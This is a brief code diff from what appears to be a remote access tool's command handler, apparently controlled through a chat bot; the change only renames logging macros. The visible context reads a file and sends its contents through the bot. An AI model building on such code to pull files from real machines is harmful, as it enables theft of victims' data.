@@ -47,7 +47,7 @@ void Handler::handleReadCommand() {
                 this->bot->sendMessage(buffer);
             }catch(const std::exception& e) {
                 const std::string message = fmt::format("Failed to read file{}", file_path.string());
-                ERROR_LOG(message);
+                HANDLER_ERROR_LOG(message);
                 this->bot->sendMessage(message); 
             }
             return;
@@ -194,8 +194,8 @@ void Handler::handleCpCommand() {
 
 }//rat::handler
 
-#undef DEBUG_LOG
-#undef ERROR_LOG
+#undef HANDLER_DEBUG_LOG
+#undef HANDLER_ERROR_LOG
 #ifdef DEBUG_RAT_HANDLER
     #undef DEBUG_RAT_HANDLER
 #endif
